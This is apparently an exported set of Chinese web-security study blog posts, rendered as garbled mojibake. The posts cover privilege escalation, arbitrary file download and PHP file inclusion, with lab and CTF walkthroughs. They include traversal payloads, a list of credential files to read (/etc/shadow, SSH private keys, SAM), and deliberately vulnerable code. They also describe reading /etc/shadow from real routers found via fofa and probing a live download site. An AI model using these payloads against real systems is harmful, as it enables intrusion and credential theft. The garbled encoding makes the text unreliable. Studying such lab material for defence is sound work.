æ¡ˆä¾‹æ¼”ç¤ºPikachu-æœ¬åœ°æ°´å¹³å‚ç›´è¶Šæƒæ¼”ç¤ºï¼ˆæ¼æ´æˆå› ï¼‰æ°´å¹³è¶Šæƒ é¦–å…ˆæˆ‘ä»¬æŸ¥çœ‹kobyç”¨æˆ·çš„ä¿¡æ¯ æˆ‘ä»¬æŠ“åŒ…å‘ç°å‚æ•°æœ‰usernameï¼Œæˆ‘ä»¬è¯•ç€æŠŠusernameä¿®æ”¹ä¸ºå…¶ä»–ç”¨æˆ·ï¼Œèƒ½ä¸èƒ½è¾¾åˆ°ä¸€ä¸ªæ°´å¹³è¶Šæƒçš„æ•ˆæœå‘¢ã€‚ 1234567891011121314GET /pikachu/vul/overpermission/op1/op1_mem.php?username=kobe&amp;submit=%E7%82%B9%E5%87%BB%E6%9F%A5%E7%9C%8B%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF HTTP/1.1Host: 127.0.0.1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: keep-aliveReferer: http://127.0.0.1/pikachu/vul/overpermission/op1/op1_mem.php?username=kobe&amp;submit=%E7%82%B9%E5%87%BB%E6%9F%A5%E7%9C%8B%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AFCookie: csrftoken=vKkecYAHNQy0hBzIqkW7oaJw91c8w1DPtQhCAWIXKPPgjuxTF3uii1r7lXPlDHeL; PHPSESSID=f269db34aa678e173b4b5da42cd715e4Upgrade-Insecure-Requests: 1Sec-Fetch-Dest: documentSec-Fetch-Mode: navigateSec-Fetch-Site: same-originSec-Fetch-User: ?1 å¦‚ä½•çŸ¥é“å…¶ä»–ç”¨æˆ·çš„ç”¨æˆ·åå‘¢ï¼Œå¯ä»¥é€šè¿‡æ³¨å†Œæ—¶ï¼Œè¯¥ç”¨æˆ·åå·²å­˜åœ¨æˆ–è€…ç½‘ç«™å…¶ä»–ä¿¡æ¯æ¥è¿›è¡Œæ”¶é›†ã€‚ å¯ä»¥çœ‹åˆ°è¿™é‡Œæˆ‘é€šè¿‡ä¿®æ”¹nameä¸ºlucyè·å–åˆ°äº†å…¶ä»–ç”¨æˆ·çš„ä¿¡æ¯ã€‚ å‚ç›´è¶Šæƒ å‰ææ¡ä»¶ å¦‚ä½•è·å–adminæ·»åŠ ç”¨æˆ·æ•°æ®åŒ… æ™®é€šç”¨æˆ·å‰ç«¯æœ‰æ“ä½œç•Œé¢å¯ä»¥æŠ“å–æ•°æ®åŒ… é€šè¿‡ç½‘ç«™æºç è¿›è¡Œæœ¬åœ°å¤ç°æŠ“å– ç›²çŒœ æœ‰ä¸¤ä¸ªç”¨æˆ·ä¸€ä¸ªæ˜¯admin/123456ä¸€ä¸ªæ˜¯pikachu/000000ã€‚å…¶ä¸­adminæ˜¯è¶…çº§ç”¨æˆ· é€šè¿‡æŠ“å–adminç”¨æˆ·æ·»åŠ å…¶ä»–ç”¨æˆ·çš„æ•°æ®åŒ… ç„¶åç™»å½•æ™®é€šç”¨æˆ·ï¼Œå°è¯•åˆ©ç”¨æŠ“å–çš„æ•°æ®åŒ…è¿›è¡Œåˆ›å»ºç”¨æˆ·ã€‚å‘ç°åˆ›å»ºå¤±è´¥ï¼Œè¿™æ˜¯å› ä¸ºå½“å‰adminç”¨æˆ·çš„Cookieå·²ç»å¤±æ•ˆï¼Œæˆ‘ä»¬æ¢æˆpikachuçš„ç”¨æˆ·è¿›è¡Œå°è¯•ï¼Œå‘ç°åˆ›å»ºæˆåŠŸã€‚ è¿™å°±æ˜¯å‚ç›´è¶Šæƒï¼Œé€šè¿‡æ™®é€šç”¨æˆ·çš„æƒé™å´æ‰§è¡Œäº†adminç”¨æˆ·çš„äº‹ã€‚ ç±»ä¼¼çš„è¿˜æœ‰é€šè¿‡ä¿®æ”¹æ™®é€šç”¨æˆ·å¯†ç ï¼Œå°†ç®¡ç†å‘˜å¯†ç ä¿®æ”¹æˆåŠŸä¹Ÿæ˜¯å‚ç›´è¶Šæƒã€‚ è¶Šæƒæ£€æµ‹-å°ç±³èŒƒè¶Šæƒæ¼æ´æ£€æµ‹å·¥å…·ï¼ˆå·¥å…·ä½¿ç”¨ï¼‰è¶Šæƒæ£€æµ‹-Burpsuite æ’ä»¶ Authz å®‰è£…æµ‹è¯•ï¼ˆæ’ä»¶ä½¿ç”¨ï¼‰1https://blog.csdn.net/weixin_33736666/article/details/113376904","categories":[],"tags":[{"name":"Web","slug":"Web","permalink":"https://al0nez.github.io/tags/Web/"},{"name":"å°è¿ªå­¦ä¹ ç¬”è®°","slug":"å°è¿ªå­¦ä¹ ç¬”è®°","permalink":"https://al0nez.github.io/tags/%E5%B0%8F%E8%BF%AA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"é€»è¾‘è¶Šæƒ","slug":"é€»è¾‘è¶Šæƒ","permalink":"https://al0nez.github.io/tags/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83/"}]},{"title":"32WEBæ¼æ´-æ–‡ä»¶æ“ä½œä¹‹æ–‡ä»¶ä¸‹è½½è¯»å–å…¨è§£","slug":"32WEBæ¼æ´-æ–‡ä»¶æ“ä½œä¹‹æ–‡ä»¶ä¸‹è½½è¯»å–å…¨è§£","date":"2021-09-21T02:35:42.000Z","updated":"2021-09-21T06:00:27.771Z","comments":true,"path":"2021/09/21/32WEBæ¼æ´-æ–‡ä»¶æ“ä½œä¹‹æ–‡ä»¶ä¸‹è½½è¯»å–å…¨è§£/","link":"","permalink":"https://al0nez.github.io/2021/09/21/32WEB%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96%E5%85%A8%E8%A7%A3/","excerpt":"ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†","text":"ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜† å‰è¨€ æ–‡ä»¶ä¸‹è½½åŸç†ä¸€äº›æä¾›äº†æ–‡ä»¶æŸ¥çœ‹æˆ–è€…ä¸‹è½½åŠŸèƒ½çš„webåº”ç”¨åœ¨å¯¹ç”¨æˆ·æŸ¥çœ‹æˆ–ä¸‹è½½çš„æ–‡ä»¶æ²¡æœ‰é™åˆ¶çš„æƒ…å†µä¸‹ï¼Œå¯¼è‡´æ¶æ„ç”¨æˆ·èƒ½å¤ŸæŸ¥çœ‹æˆ–ä¸‹è½½ä»»æ„æ•æ„Ÿæ–‡ä»¶ æ£€æµ‹ç™½ç›’ ä»£ç å®¡è®¡ é»‘ç›’ å…¬å¼€æ¼æ´ æ¼æ‰«å·¥å…· æ‰‹å·¥çœ‹å‚æ•°å€¼åŠåŠŸèƒ½ åˆ©ç”¨ å¸¸è§æ–‡ä»¶ åå°æ—¥å¿—ç­‰å¯è§çš„æ–‡ä»¶ æ•æ„Ÿæ–‡ä»¶ æ•°æ®åº“é…ç½®æ–‡ä»¶ å„ç§æ¥å£æ–‡ä»¶ å¯†é’¥ä¿¡æ¯ç­‰æ–‡ä»¶ 123456789101112131415161718192021222324252627282930313233343536373839Windows:C:\\boot.ini //æŸ¥çœ‹ç³»ç»Ÿç‰ˆæœ¬C:\\Windows\\System32\\inetsrv\\MetaBase.xml //IISé…ç½®æ–‡ä»¶C:\\Windows\\repair\\sam //å­˜å‚¨ç³»ç»Ÿåˆæ¬¡å®‰è£…çš„å¯†ç C:\\Program Files\\mysql\\my.ini //Mysqlé…ç½®C:\\Program Files\\mysql\\data\\mysql\\user.MYD //Mysql rootC:\\Windows\\php.ini //phpé…ç½®ä¿¡æ¯C:\\Windows\\my.ini //Mysqlé…ç½®ä¿¡æ¯Linux/root/.ssh/authorized_keys //å¦‚éœ€ç™»å½•åˆ°è¿œç¨‹ä¸»æœºï¼Œéœ€è¦åˆ°.sshç›®å½•ä¸‹ï¼Œæ–°å»ºauthorized_keysæ–‡ä»¶ï¼Œå¹¶å°†id_rsa.pubå†…å®¹å¤åˆ¶è¿›å»/root/.ssh/id_rsa //sshç§é’¥,sshå…¬é’¥æ˜¯id_rsa.pub/root/.ssh/id_ras.keystore //è®°å½•æ¯ä¸ªè®¿é—®è®¡ç®—æœºç”¨æˆ·çš„å…¬é’¥/root/.ssh/known_hosts//sshä¼šæŠŠæ¯ä¸ªè®¿é—®è¿‡è®¡ç®—æœºçš„å…¬é’¥(public key)éƒ½è®°å½•åœ¨~/.ssh/known_hostsã€‚å½“ä¸‹æ¬¡è®¿é—®ç›¸åŒè®¡ç®—æœºæ—¶ï¼ŒOpenSSHä¼šæ ¸å¯¹å…¬é’¥ã€‚å¦‚æœå…¬é’¥ä¸åŒï¼ŒOpenSSHä¼šå‘å‡ºè­¦å‘Šï¼Œ é¿å…ä½ å—åˆ°DNS Hijackä¹‹ç±»çš„æ”»å‡»ã€‚/etc/passwd // è´¦æˆ·ä¿¡æ¯/etc/shadow // è´¦æˆ·å¯†ç æ–‡ä»¶/etc/my.cnf //mysql é…ç½®æ–‡ä»¶/etc/httpd/conf/httpd.conf // Apacheé…ç½®æ–‡ä»¶/root/.bash_history //ç”¨æˆ·å†å²å‘½ä»¤è®°å½•æ–‡ä»¶/root/.mysql_history //mysqlå†å²å‘½ä»¤è®°å½•æ–‡ä»¶/proc/self/fd/fd[0-9]*(æ–‡ä»¶æ ‡è¯†ç¬¦)/proc/mounts //è®°å½•ç³»ç»ŸæŒ‚è½½è®¾å¤‡/porc/config.gz //å†…æ ¸é…ç½®æ–‡ä»¶/var/lib/mlocate/mlocate.db //å…¨æ–‡ä»¶è·¯å¾„/porc/self/cmdline //å½“å‰è¿›ç¨‹çš„cmdlineå‚æ•°java+apacheç«™ç‚¹:/conf/tomcat-users.xml/WEB-INF/classes/applicationContext.xml/WEB-INF/web.xml/etc/httpd/conf/httpd.conf/etc/apache2/httpd.conf/etc/apache2/apache2.confnginxæœåŠ¡å™¨:/etc/nginx/nginx.conf/usr/local/nginx/conf/nginx.conf/usr/local/etc/nginx/nginx.conf ä¸‹è½½å‚æ•°12345678read.xxx?filename=down.xxx?filename=readfile.xxx?file=downfile.xxx?file=../ ..\\ .\\ ./ç­‰%00 ? %23 %20 .ç­‰&amp;readpath=ã€&amp;filepath=ã€&amp;path=ã€&amp;inputfile=ã€&amp;url=ã€&amp;data=ã€&amp;readfile=ã€&amp;menu=ã€META-INF= ã€WEB-INF å„ç§åè®®è°ƒç”¨é…åˆJavaweb æ–‡ä»¶ä¸‹è½½ä»£ç  123456789101112131415161718192021222324252627282930&lt;%@ page language=&quot;java&quot; import=&quot;java.util.*&quot; pageEncoding=&quot;UTF-8&quot;%&gt;&lt;%String path = request.getContextPath();String basePath =request.getScheme()+&quot;://&quot;+request.getServerName()+&quot;:&quot;+request.getServerPort()+path+&quot;/&quot;;%&gt;&lt;a href=&quot;/download/DownloadServlet?filename=1.jpg&quot;&gt;æ–‡ä»¶ä¸‹è½½&lt;/a&gt;public void doGet(HttpServletRequest request, HttpServletResponse response)throws ServletException, IOException &#123;response.setCharacterEncoding(&quot;UTF-8&quot;);//è®¾ç½® ContentType å­—æ®µå€¼response.setContentType(&quot;text/html;charset=utf-8&quot;);//è·å–æ‰€è¦ä¸‹è½½çš„æ–‡ä»¶åç§°String filename = request.getParameter(&quot;filename&quot;);//ä¸‹è½½æ–‡ä»¶æ‰€åœ¨ç›®å½•String folder = &quot;/filename/&quot;;//é€šçŸ¥æµè§ˆå™¨ä»¥ä¸‹è½½çš„æ–¹å¼æ‰“å¼€response.addHeader(&quot;Content-type&quot;, &quot;appllication/octet-stream&quot;);response.addHeader(&quot;Content-Disposition&quot;, &quot;attachment;filename=&quot;+filename);//é€šçŸ¥æ–‡ä»¶æµè¯»å–æ–‡ä»¶InputStream in = getServletContext().getResourceAsStream(folder+filename);//è·å– response å¯¹è±¡çš„è¾“å‡ºæµOutputStream out = response.getOutputStream();byte[] buffer = new byte[1024];int len;//å¾ªç¯å–å‡ºæµä¸­çš„æ•°æ®while((len = in.read(buffer)) != -1)&#123;out.write(buffer,0,len);&#125;&#125; æ¶‰åŠæ¡ˆä¾‹ï¼šPikachu-æ–‡ä»¶ä¸‹è½½æµ‹è¯•-å‚æ•°ç‚¹å‡»å›¾ç‰‡ä¼šè¿›è¡Œä¸‹è½½ï¼Œä¸‹è½½é“¾æ¥å¦‚ä¸‹ï¼Œå¯ä»¥å¾ˆå®¹æ˜“çœ‹å‡ºæ˜¯æ–‡ä»¶ä¸‹è½½æ¼æ´ï¼Œåªéœ€è¦ä¿®æ”¹filenameåé¢çš„å‚æ•°å°±å¯ä»¥ä¸‹è½½ä»»æ„æ–‡ä»¶ã€‚ 1http://127.0.0.1/pikachu/vul/unsafedownload/execdownload.php?filename=kb.png å›¾ç‰‡é“¾æ¥åœ°å€ 1http://127.0.0.1/pikachu/vul/unsafedownload/download/kb.png å¯ä»¥çœ‹åˆ°ä»–ä»¬ä¸åœ¨ä¸€ä¸ªç›®å½•ä¸‹ï¼Œè¿™é‡Œæˆ‘è¯•ç€ä¸‹è½½ä¸€ä¸‹execdownload.phpæ–‡ä»¶ï¼Œæ‰€æœ‰éœ€è¦é€€ä¸€çº§ç›®å½• 1http://127.0.0.1/pikachu/vul/unsafedownload/execdownload.php?filename=../execdownload.php å¯ä»¥çœ‹åˆ°æˆ‘ä»¬æˆåŠŸä¸‹è½½äº†è¿™ä¸ªæ–‡ä»¶ã€‚é‚£ä¹ˆæˆ‘ä»¬æ˜¯ä¸æ˜¯å¯ä»¥ä¸‹è½½é…ç½®æ–‡ä»¶å‘¢ï¼æŸ¥çœ‹æˆ‘ä»¬åˆšä¸‹è½½çš„æ–‡ä»¶å‘ç°æœ‰ä¸€ä¸ªé…ç½®æ–‡ä»¶ã€‚ 1http://127.0.0.1/pikachu/vul/unsafedownload/execdownload.php?filename=../../../inc/function.php æˆåŠŸä¸‹è½½åˆ°è¯¥æ–‡ä»¶ Zdns-æ–‡ä»¶ä¸‹è½½çœŸå®æµ‹è¯•-åŠŸèƒ½ç‚¹å½“æˆ‘ä»¬ç‚¹å‡»ä¸‹è½½åä¼šè¿›è¡Œä¸‹è½½ å¤åˆ¶ä¸‹è½½é“¾æ¥å‘ç°é—®é¢˜ï¼Œè¿™é‡Œç”¨äº†base64åŠ å¯† 1http://down.znds.com/getdownurl/?s=L2Rvd24vMjAyMTA4MDYveXN0cHpzXzEuMS43X2RhbmdiZWkuYXBr å¯ä»¥çœ‹åˆ°ç»è¿‡è§£å¯†å‘ç°ï¼Œè¿™é‡ŒåŠ å¯†çš„å†…å®¹å’Œæˆ‘ä»¬ä¸‹è½½çš„åå­—ä¸€æ · 12345L2Rvd24vMjAyMTA4MDYveXN0cHpzXzEuMS43X2RhbmdiZWkuYXBrè§£å¯†:/down/20210806/ystpzs_1.1.7_dangbei.apk æˆ‘ä»¬ä¸‹è½½ä¸€ä¸‹ä»–çš„htmlæ–‡ä»¶ 123http://down.znds.com/getdownurl/?s=../apk/app/2019/0909/7206.htmlåŠ å¯†åhttp://down.znds.com/getdownurl/?s=Li4vYXBrL2FwcC8yMDE5LzA5MDkvNzIwNi5odG1s é“¾æ¥è¢«é‡ç½®äº†ã€‚ã€‚ä½†æ˜¯æ¼æ´åº”è¯¥å­˜åœ¨ å°ç±³è·¯ç”±å™¨-æ–‡ä»¶è¯»å–çœŸå®æµ‹è¯•-æ¼æ´fofaä¸­å¯ä»¥æ‰¾åˆ° 1http://xxxxx:8888/api-third-party/download/extdisks../etc/shadow å¯ä»¥çœ‹åˆ°æˆ‘ä»¬å¯ä»¥æˆåŠŸä¸‹è½½åˆ°ä»–çš„æ–‡ä»¶ RoarCTF2019-æ–‡ä»¶è¯»å–çœŸé¢˜å¤ç°-æ¯”èµ›å¯ä»¥çœ‹åˆ°è¿™ä¸ªé“¾æ¥å­˜åœ¨ä¸€ä¸ªæ–‡ä»¶ä¸‹è½½æ¼æ´ï¼Œå› ä¸ºæ˜¯javaç¯å¢ƒï¼Œæ‰€æœ‰ä»–çš„é…ç½®æ–‡ä»¶ç›®å½•æ˜¯/WEB-INF/web.xml 1http://4f51f59a-99ce-4c6a-8827-f3a83c98ce38.node4.buuoj.cn:81/Download?filename=help.docx è¿™é‡Œä¿®æ”¹ä¸‹è½½å‚æ•° 1http://4f51f59a-99ce-4c6a-8827-f3a83c98ce38.node4.buuoj.cn:81/Download?filename=/WEB-INF/web.xml è¿™é‡Œæœ‰ä¸ªå°çŸ¥è¯†ç‚¹è¿”å›è¿™ä¸ªé”™è¯¯ï¼Œè¡¨ç¤ºjavaæ¥æ”¶çš„æ˜¯POSTå‚æ•°ï¼Œä¸æ˜¯GET è¿™é‡ŒæˆåŠŸä¸‹è½½åˆ°é…ç½®æ–‡ä»¶ ç„¶åæ‰“å¼€å‘ç°äº†flagçš„ä¿¡æ¯ 12345678&lt;servlet&gt; &lt;servlet-name&gt;FlagController&lt;/servlet-name&gt; &lt;servlet-class&gt;com.wm.ctf.FlagController&lt;/servlet-class&gt; &lt;-&lt;/servlet&gt;&lt;servlet-mapping&gt; &lt;servlet-name&gt;FlagController&lt;/servlet-name&gt; &lt;url-pattern&gt;/Flag&lt;/url-pattern&gt;&lt;/servlet-mapping&gt; ç†Ÿæ‚‰javawebå¼€å‘çš„åº”è¯¥çŸ¥é“ï¼Œæ­¤å¤„æŒ‡çš„è·¯å¾„æ˜¯WEB-INF/classes/com/wm/ctf/FlagController.class æ ¹æ®è¯¥è·¯å¾„æˆåŠŸä¸‹è½½åˆ°flagæ–‡ä»¶ 1ZmxhZ3thM2E1ZDFkOC0xY2UwLTQwNDMtYTAzMi1mYzE4ODYzZDVjMzR9Cg== ç»è¿‡è§£å¯†æˆä¸º 1flag&#123;a3a5d1d8-1ce0-4043-a032-fc18863d5c34&#125; ç™¾åº¦æ¯ 2017 äºŒæœˆ-Zone çœŸé¢˜å¤ç°-æ¯”èµ›æ‹“å±•é€šè¿‡æŠ“åŒ…å‘ç°Cookieä¸­login=0ï¼Œæˆ‘ä»¬è¯•ç€ä¿®æ”¹ä¸º1 ç™»å½•æˆåŠŸåç»§ç»­æŠ“åŒ… è¿™é‡Œå‘ç°æ–‡ä»¶ä¸‹è½½æ¼æ´ï¼ŒæˆåŠŸè¯»å–åˆ°passwdæ–‡ä»¶ 1..././..././..././etc/passwd æ¶‰åŠèµ„æº https://www.seebug.org/vuldb/ssvid-98122 https://www.ichunqiu.com/battalion?t=1&amp;r=57475 https://blog.csdn.net/Cheng_May/article/details/78600833 https://buuoj.cn/challenges#%5BRoarCTF%202019%5DEasy%20Java","categories":[],"tags":[{"name":"Web","slug":"Web","permalink":"https://al0nez.github.io/tags/Web/"},{"name":"å°è¿ªå­¦ä¹ ç¬”è®°","slug":"å°è¿ªå­¦ä¹ ç¬”è®°","permalink":"https://al0nez.github.io/tags/%E5%B0%8F%E8%BF%AA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"æ–‡ä»¶ä¸‹è½½","slug":"æ–‡ä»¶ä¸‹è½½","permalink":"https://al0nez.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/"}]},{"title":"31WEBæ¼æ´-æ–‡ä»¶æ“ä½œä¹‹æ–‡ä»¶åŒ…å«æ¼æ´å…¨è§£","slug":"31WEBæ¼æ´-æ–‡ä»¶æ“ä½œä¹‹æ–‡ä»¶åŒ…å«æ¼æ´å…¨è§£","date":"2021-09-21T02:34:57.000Z","updated":"2021-09-21T06:00:32.657Z","comments":true,"path":"2021/09/21/31WEBæ¼æ´-æ–‡ä»¶æ“ä½œä¹‹æ–‡ä»¶åŒ…å«æ¼æ´å…¨è§£/","link":"","permalink":"https://al0nez.github.io/2021/09/21/31WEB%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/","excerpt":"ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†","text":"ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜† ä»€ä¹ˆæ˜¯æ–‡ä»¶åŒ…å«ä¸ºäº†æ›´å¥½çš„ä½¿ç”¨ä»£ç çš„é‡ç”¨æ€§ï¼Œå¼•å…¥äº†æ–‡ä»¶åŒ…å«å‡½æ•°ï¼Œå¯ä»¥é€šè¿‡æ–‡ä»¶åŒ…å«å‡½æ•°å°†æ–‡ä»¶åŒ…å«è¿›æ¥ï¼Œç›´æ¥ä½¿ç”¨åŒ…å«æ–‡ä»¶çš„ä»£ç ã€‚ æ–‡ä»¶åŒ…å«äº§ç”ŸåŸå› åœ¨åŒ…å«æ–‡ä»¶æ—¶å€™ï¼Œä¸ºäº†çµæ´»åŒ…å«æ–‡ä»¶ï¼Œå°†åŒ…å«æ–‡ä»¶è®¾ç½®ä¸ºå˜é‡ï¼Œé€šè¿‡åŠ¨æ€å˜é‡å¼•å…¥éœ€è¦åŒ…å«çš„æ–‡ä»¶æ—¶ï¼Œç”¨æˆ·å¯ä»¥é€šè¿‡æ§åˆ¶å˜é‡ï¼Œè€ŒæœåŠ¡å™¨ç«¯æ²¡æœ‰æ ¡éªŒå˜é‡ï¼Œä»è€Œå¯¼è‡´æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œé€šå¸¸æ­¤æ¼æ´å‡ºç°åœ¨PHPä¸­ã€‚ 12345&lt;?php$file = $_GET[&#x27;file&#x27;];include($file);.......?&gt; æ–‡ä»¶åŒ…å«å‡½æ•° include include_once require require_once include ï¼ˆæˆ– requireï¼‰è¯­å¥ä¼šè·å–æŒ‡å®šæ–‡ä»¶ä¸­å­˜åœ¨çš„æ‰€æœ‰æ–‡æœ¬/ä»£ç /æ ‡è®°ï¼Œå¹¶å¤åˆ¶åˆ°ä½¿ç”¨ include è¯­å¥çš„æ–‡ä»¶ä¸­ã€‚ include å’Œ require è¯­å¥æ˜¯ç›¸åŒçš„ï¼Œé™¤äº†é”™è¯¯å¤„ç†æ–¹é¢ï¼š require ä¼šç”Ÿæˆè‡´å‘½é”™è¯¯ï¼ˆE_COMPILE_ERRORï¼‰å¹¶åœæ­¢è„šæœ¬ include åªç”Ÿæˆè­¦å‘Šï¼ˆE_WARNINGï¼‰ï¼Œå¹¶ä¸”è„šæœ¬ä¼šç»§ç»­ include_once å‡½æ•°ä¼šå°†æŒ‡å®šçš„æ–‡ä»¶è½½å…¥å¹¶æ‰§è¡Œé‡Œé¢çš„ç¨‹åºï¼›æ­¤è¡Œä¸ºå’Œ include è¯­å¥ç±»ä¼¼ï¼Œå”¯ä¸€åŒºåˆ«æ˜¯å¦‚æœè¯¥æ–‡ä»¶ä¸­å·²ç»è¢«åŒ…å«è¿‡ï¼Œåˆ™ä¸ä¼šå†æ¬¡åŒ…å«ã€‚ require_onceä¹Ÿæ˜¯ä¸€æ ·çš„ï¼Œå½“å¤„ç†åˆ°é”™è¯¯çš„æ—¶å€™ï¼Œrequire_onceä¼šåœæ­¢è„šæœ¬ï¼Œinclude_onceä¸ä¼šã€‚ ä¾‹å­æ–‡ä»¶åŒ…å«ä»£ç  12345678&lt;?php$filename=$_GET[&#x27;filename&#x27;];include($filename);/*$filename=$_GET[&#x27;filename&#x27;];include($filename.&quot;.html&quot;);*/?&gt; æœ¬æ¥æ–‡ä»¶æ˜¯txtçš„æ–‡æœ¬ ä½†æ˜¯é€šè¿‡æ–‡ä»¶åŒ…å«èƒ½å¤Ÿæ‰§è¡Œå…¶ä¸­çš„ä»£ç  æ£€æµ‹ç™½ç›’ä»£ç å®¡è®¡ é»‘ç›’ æ¼æ‰«å·¥å…· å…¬å¼€æ¼æ´ æ‰‹å·¥çœ‹å‚æ•°å€¼åŠåŠŸèƒ½ æœ¬åœ°æ–‡ä»¶åŒ…å«æ–‡ä»¶å’Œç½‘ç«™åœ¨ä¸€ä¸ªæœåŠ¡å™¨ä¸Šï¼Œç±»ä¼¼åƒ127.0.0.1/?file=../../phpinfo.phpè¿™æ ·å°±å±äºæœ¬åœ°æ–‡ä»¶åŒ…å« ç±»å‹æ— é™åˆ¶å› ä¸º1.txtåœ¨æ ¹ç›®å½•ä¸‹ï¼Œè€Œtest/phpå’Œå¥¹æœ‰2çº§ç›®å½•ï¼Œæ‰€æœ‰éœ€è¦../é€€ä¿©æ¬¡ç›®å½• 1http://127.0.0.1/123/upload/test.php?filename=../../1.txt æœ‰é™åˆ¶12$filename=$_GET[&#x27;filename&#x27;];include($filename.&quot;.html&quot;); includeä¼šåœ¨filenameåé¢æ·»åŠ ä¸€ä¸ª.htmlã€‚ %00æˆªæ–­ç»•è¿‡ åˆ©ç”¨æ¡ä»¶ magic_quotes_gpc = Off phpç‰ˆæœ¬&lt;5.3.4 é•¿åº¦æˆªæ–­ç»•è¿‡ åˆ©ç”¨æ¡ä»¶ windowsï¼Œç‚¹å·éœ€è¦é•¿äº250;linuxé•¿äº4096 å¥½åƒç»•è¿‡ä¸å»äº†ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ è¿œç¨‹æ–‡ä»¶åŒ…å«(å±å®³æ›´å¤§)æ–‡ä»¶å’Œç½‘ç«™ä¸åœ¨ä¸€ä¸ªæœåŠ¡å™¨ä¸Šï¼Œç±»ä¼¼åƒ127.0.0.1/?file=www.baidu.comè¿™æ ·å°±å±äºè¿œç¨‹æ–‡ä»¶åŒ…å«ã€‚ ç±»å‹å‰ææ¡ä»¶ allow_url_fopenï¼šä¸ºONæ—¶ï¼Œèƒ½è¯»å–è¿œç¨‹æ–‡ä»¶ï¼Œä¾‹å¦‚file_get_contents()å°±èƒ½è¯»å–è¿œç¨‹æ–‡ä»¶ allow_url_include:ä¸ºONæ—¶ï¼Œå°±å¯ä»¥ä½¿ç”¨includeå’Œrequireçš„æ–¹å¼åŒ…å«è¿œç¨‹æ–‡ä»¶ã€‚ æ— é™åˆ¶ å¦‚æœè¿œç¨‹ä»£ç æ—¶åé—¨ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡è¿œç¨‹æ–‡ä»¶åŒ…å«ä»è€Œè·å–webshellã€‚ æœ‰é™åˆ¶ é€šè¿‡åœ¨åé¢å¢åŠ ç‰¹æ®Šç¬¦å·æ¥ç»•è¿‡ 1%20ã€%23ã€? å„ç§åè®®æµçš„ç©æ³•PHPä¼ªåè®®æ€»ç»“file:// åè®®ä½¿ç”¨æ¡ä»¶ï¼š allow_url_fopen:off/on allow_url_fopen:off/on ä½œç”¨ç”¨äºè®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿï¼Œåœ¨CTFä¸­é€šå¸¸ç”¨æ¥è¯»å–æœ¬åœ°æ–‡ä»¶çš„ä¸”ä¸å—allow_url_fopenä¸allow_url_includeçš„å½±å“ã€‚include()/require()/include_once()/require_once()å‚æ•°å¯æ§çš„æƒ…å†µä¸‹ï¼Œå¦‚å¯¼å…¥ä¸ºé.phpæ–‡ä»¶ï¼Œåˆ™ä»æŒ‰ç…§phpè¯­æ³•è¿›è¡Œè§£æï¼Œè¿™æ˜¯include()å‡½æ•°æ‰€å†³å®šçš„ã€‚ è¯´æ˜æ–‡ä»¶ç³»ç»Ÿ æ˜¯ PHP ä½¿ç”¨çš„é»˜è®¤å°è£…åè®®ï¼Œå±•ç°äº†æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿã€‚ å½“æŒ‡å®šäº†ä¸€ä¸ªç›¸å¯¹è·¯å¾„ï¼ˆä¸ä»¥/ã€\\ã€\\æˆ– Windows ç›˜ç¬¦å¼€å¤´çš„è·¯å¾„ï¼‰æä¾›çš„è·¯å¾„å°†åŸºäºå½“å‰çš„å·¥ä½œç›®å½•ã€‚ åœ¨å¾ˆå¤šæƒ…å†µä¸‹æ˜¯è„šæœ¬æ‰€åœ¨çš„ç›®å½•ï¼Œé™¤éè¢«ä¿®æ”¹äº†ã€‚ ä½¿ç”¨ CLI çš„æ—¶å€™ï¼Œç›®å½•é»˜è®¤æ˜¯è„šæœ¬è¢«è°ƒç”¨æ—¶æ‰€åœ¨çš„ç›®å½•ã€‚åœ¨æŸäº›å‡½æ•°é‡Œï¼Œä¾‹å¦‚ fopen() å’Œ file_get_contents()ï¼Œ include_path ä¼šå¯é€‰åœ°æœç´¢ï¼Œä¹Ÿä½œä¸ºç›¸å¯¹çš„è·¯å¾„ã€‚ ç”¨æ³•1234567/path/to/file.extrelative/path/to/file.extfileInCwd.extC:/path/to/winfile.extC:\\path\\to\\winfile.ext\\\\smbserver\\share\\path\\to\\winfile.extfile:///path/to/file.ext ç¤ºä¾‹1.file://[æ–‡ä»¶çš„ç»å¯¹è·¯å¾„å’Œæ–‡ä»¶å] 1http://127.0.0.1/upload-labs/include.php?file=file://D:\\phpstudy\\www\\phpinfo.txt 2.[æ–‡ä»¶çš„ç›¸å¯¹è·¯å¾„å’Œæ–‡ä»¶å] 1http://127.0.0.1/upload-labs/include.php?file=../phpinfo.txt 3.[httpï¼š//ç½‘ç»œè·¯å¾„å’Œæ–‡ä»¶å] è¿™é‡Œè¿›è¡Œè¿œç¨‹è®¿é—®çš„æ—¶å€™éœ€è¦allow_url_include=Onæ¨¡å¼ 